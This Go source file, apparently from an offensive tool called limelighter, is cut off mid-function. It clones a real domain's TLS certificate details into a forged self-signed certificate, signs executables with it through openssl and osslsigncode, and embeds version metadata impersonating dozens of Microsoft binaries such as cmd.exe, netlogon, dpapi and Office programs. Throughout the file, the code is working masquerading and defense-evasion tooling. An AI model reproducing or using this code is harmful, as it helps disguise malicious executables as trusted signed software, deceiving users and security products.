package limelighter

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	crand "math/rand"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/josephspurrier/goversioninfo"
)

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

func VarNumberLength(min, max int) string {
	var r string
	crand.Seed(time.Now().UnixNano())
	num := crand.Intn(max-min) + min
	n := num
	r = RandStringBytes(n)
	return r
}
func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[crand.Intn(len(letters))]

	}
	return string(b)
}

func GenerateCert(domain string, inputFile string) {
	var err error
	rootKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		panic(err)
	}
	certs, err := GetCertificatesPEM(domain + ":443")
	if err != nil {
		os.Chdir("..")
		foldername := strings.Split(inputFile, ".")
		os.RemoveAll(foldername[0])
		log.Fatal("Error: The domain: " + domain + " does not exist or is not accessible from the host you are compiling on")
	}
	block, _ := pem.Decode([]byte(certs))
	cert, _ := x509.ParseCertificate(block.Bytes)

	keyToFile(domain+".key", rootKey)

	SubjectTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Subject.CommonName,
		},
		NotBefore:             cert.NotBefore,
		NotAfter:              cert.NotAfter,
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
	}
	IssuerTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Issuer.CommonName,
		},
		NotBefore: cert.NotBefore,
		NotAfter:  cert.NotAfter,
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &SubjectTemplate, &IssuerTemplate, &rootKey.PublicKey, rootKey)
	if err != nil {
		panic(err)
	}
	certToFile(domain+".pem", derBytes)

}

func keyToFile(filename string, key *rsa.PrivateKey) {
	file, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	b, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Unable to marshal RSA private key: %v", err)
		os.Exit(2)
	}
	if err := pem.Encode(file, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: b}); err != nil {
		panic(err)
	}
}

func certToFile(filename string, derBytes []byte) {
	certOut, err := os.Create(filename)
	if err != nil {
		log.Fatalf("[-] Failed to Open cert.pem for Writing: %s", err)
	}
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
		log.Fatalf("[-] Failed to Write Data to cert.pem: %s", err)
	}
	if err := certOut.Close(); err != nil {
		log.Fatalf("[-] Error Closing cert.pem: %s", err)
	}
}

func GetCertificatesPEM(address string) (string, error) {
	conn, err := tls.Dial("tcp", address, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return "", err
	}
	defer conn.Close()
	var b bytes.Buffer
	for _, cert := range conn.ConnectionState().PeerCertificates {
		err := pem.Encode(&b, &pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert.Raw,
		})
		if err != nil {
			return "", err
		}
	}
	return b.String(), nil
}

func GeneratePFK(password string, domain string) {
	cmd := exec.Command("openssl", "pkcs12", "-export", "-out", domain+".pfx", "-inkey", domain+".key", "-in", domain+".pem", "-passin", "pass:"+password+"", "-passout", "pass:"+password+"")
	err := cmd.Run()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
}

func SignExecutable(password string, pfx string, filein string, fileout string) {
	cmd := exec.Command("osslsigncode", "sign", "-pkcs12", pfx, "-in", ""+filein+"", "-out", ""+fileout+"", "-pass", ""+password+"")
	err := cmd.Run()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
}

func FileProperties(name string, configFile string) string {
	fmt.Println("[*] Creating an Embedded Resource File")
	vi := &goversioninfo.VersionInfo{}
	if configFile != "" {
		var err error
		input := io.ReadCloser(os.Stdin)
		if input, err = os.Open("../" + configFile); err != nil {
			log.Printf("Cannot open %q: %v", configFile, err)
			os.Exit(3)
		}
		jsonBytes, err := ioutil.ReadAll(input)
		input.Close()
		if err != nil {
			log.Printf("Error reading %q: %v", configFile, err)
			os.Exit(3)
		}
		if err := vi.ParseJSON(jsonBytes); err != nil {
			log.Printf("Could not parse the .json file: %v", err)
			os.Exit(3)
		}
		name = vi.StringFileInfo.InternalName
	} else if configFile == "" {
		if name == "APMon" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "APMon.dll.mui"
			vi.StringFileInfo.FileDescription = "Adaptive Port Monitor"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\APMon.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "APMon.dll.mui"
		}
		if name == "bisr" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "bisrv.dll.mui"
			vi.StringFileInfo.FileDescription = "Background Tasks Infrastructure Service"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\bisrv.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "bisrv.dll.mui"
		}
		if name == "btpanui" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "btpanui.dll.mui"
			vi.StringFileInfo.FileDescription = "Bluetooth PAN User Interface"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\btpanui.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "btpanui.dll.mui"
		}
		if name == "cmdext" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "CmdExt.DLL"
			vi.StringFileInfo.FileDescription = "cmd.exe Extension DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\cmdext.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "CmdExt.DLL"
		}
		if name == "httpapi" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "httpapi.dll.mui"
			vi.StringFileInfo.FileDescription = "HTTP Protocol Stack API"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\httpapi.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "httpapi.dll.mui"
		}
		if name == "logoncli" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "LOGONCLI.DLL"
			vi.StringFileInfo.FileDescription = "Net Logon Client DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1237 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\logoncli.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1237"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1237
			vi.StringFileInfo.InternalName = "LOGONCLI.DLL"
		}
		if name == "netlogon" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "NetLogon.DLL.MUI"
			vi.StringFileInfo.FileDescription = "Net Logon Services DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\netlogon.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "NetLogon.DLL.MUI"
		}
		if name == "tcpmon" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "tcpmon.dll.mui"
			vi.StringFileInfo.FileDescription = "Standard TCP/IP Port Monitor DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\tcpmon.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "tcpmon.dll.mui"
		}
		if name == "OneNote" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "OneNote"
			vi.StringFileInfo.FileDescription = "Microsoft OneNote"
			vi.StringFileInfo.FileVersion = "16.0.13901.20462"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE"
			vi.FixedFileInfo.ProductVersion.Patch = 13901
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.13901.20462"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 13901
			vi.FixedFileInfo.FileVersion.Build = 20462
			vi.StringFileInfo.InternalName = "OneNote"
		}

		if name == "Excel" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Excel"
			vi.StringFileInfo.FileDescription = "Microsoft Excel"
			vi.StringFileInfo.FileVersion = "16.0.11929.20838"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
			vi.FixedFileInfo.ProductVersion.Patch = 11929
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.11929.20838"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 11929
			vi.FixedFileInfo.FileVersion.Build = 20838
			vi.StringFileInfo.InternalName = "Excel"
		}
		if name == "Word" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Word"
			vi.StringFileInfo.FileDescription = "Microsoft Word"
			vi.StringFileInfo.FileVersion = "16.0.11929.20838"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WORD.EXE"
			vi.FixedFileInfo.ProductVersion.Patch = 11929
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.11929.20838"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 11929
			vi.FixedFileInfo.FileVersion.Build = 20838
			vi.StringFileInfo.InternalName = "Word"
		}
		if name == "Powerpnt" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "POWERPNT"
			vi.StringFileInfo.FileDescription = "Microsoft PowerPoint"
			vi.StringFileInfo.FileVersion = "16.0.11929.20838"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE"
			vi.FixedFileInfo.ProductVersion.Patch = 11929
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.11929.20838"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 11929
			vi.FixedFileInfo.FileVersion.Build = 20838
			vi.StringFileInfo.InternalName = "POWERPNT"
		}
		if name == "Outlook" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Outlook.exe"
			vi.StringFileInfo.FileDescription = "Microsoft Outlook"
			vi.StringFileInfo.FileVersion = "16.0.11929.20838"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
			vi.FixedFileInfo.ProductVersion.Patch = 11929
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.11929.20838"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 11929
			vi.FixedFileInfo.FileVersion.Build = 20838
			vi.StringFileInfo.InternalName = "Outlook"
		}
		if name == "lync" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Lync"
			vi.StringFileInfo.FileDescription = "Skype for Business"
			vi.StringFileInfo.FileVersion = "16.0.11929.20838"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Program Files\\Microsoft Office\\root\\Office16\\lync.exe"
			vi.FixedFileInfo.ProductVersion.Patch = 11929
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.11929.20838"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 11929
			vi.FixedFileInfo.FileVersion.Build = 20838
			vi.StringFileInfo.InternalName = "Lync"
		}
		if name == "cmd" {
			vi.StringFileInfo.InternalName = "cmd"
			vi.StringFileInfo.FileDescription = "Windows Command Processor"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\cmd.exe"
			vi.FixedFileInfo.ProductVersion.Patch = 1
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 1
			vi.FixedFileInfo.FileVersion.Build = 18362
			vi.StringFileInfo.InternalName = "cmd.exe"
		}
		if name == "OneDrive" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "OneDrive.exe"
			vi.StringFileInfo.FileDescription = "Microsoft OneDrive"
			vi.StringFileInfo.FileVersion = "20.114.0607.0002"
			vi.StringFileInfo.LegalCopyright = "©¿½ Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "OneDrive.exe"
			vi.FixedFileInfo.ProductVersion.Patch = 2
			vi.FixedFileInfo.ProductVersion.Major = 20
			vi.FixedFileInfo.ProductVersion.Minor = 114
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "20.114.0607.0002"
			vi.FixedFileInfo.FileVersion.Major = 20
			vi.FixedFileInfo.FileVersion.Minor = 114
			vi.FixedFileInfo.FileVersion.Patch = 2
			vi.FixedFileInfo.FileVersion.Build = 607
			vi.StringFileInfo.InternalName = "OneDrive.exe"
		}
		if name == "apphelp" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "Apphelp"
			vi.StringFileInfo.FileDescription = "Application Compatibility Client Library"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "Apphelp.dll"
		}
		if name == "bcryptprimitives" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "bcryptprimitives.dll"
			vi.StringFileInfo.FileDescription = "Windows Cryptographic Primitives Library"
			vi.StringFileInfo.FileVersion = "10.0.18362.836 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.836"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 836
			vi.StringFileInfo.OriginalFilename = "bcryptprimitives.dll"
		}
		if name == "cfgmgr32" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "cfgmgr32.dll"
			vi.StringFileInfo.FileDescription = "Configuration Manager DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.387 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.387"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 387
			vi.StringFileInfo.OriginalFilename = "cfgmgr32.dll"
		}
		if name == "combase" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "COMBASE.DLL"
			vi.StringFileInfo.FileDescription = "Microsoft COM for Windows"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "COMBASE.DLL"
		}
		if name == "cryptsp" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "cryptsp.dll"
			vi.StringFileInfo.FileDescription = "Cryptographic Service Provider API"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "cryptsp.dll"
		}
		if name == "dnsapi" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "dnsapi"
			vi.StringFileInfo.FileDescription = "DNS Client API DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "dnsapi"
		}
		if name == "dpapi" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "dpapi.dll"
			vi.StringFileInfo.FileDescription = "Data Protection API"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "dpapi.dll"
		}
		if name == "sechost" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "sechost.dll"
			vi.StringFileInfo.FileDescription = "Host for SCM/SDDL/LSA Lookup APIs"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "sechost.dll"
		}
		if name == "schannel" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "schannel.dll"
			vi.StringFileInfo.FileDescription = "TLS / SSL Security Provider"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "schannel.dll"
		}
		if name == "urlmon" {
			vi.StringFileInfo.CompanyName = "Microsoft Corporation"
			vi.StringFileInfo.InternalName = "UrlMon.dll"
			vi.StringFileInfo.FileDescription = "OLE32 Extensions for Win32"
			vi.StringFileInfo.FileVersion = "11.00.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
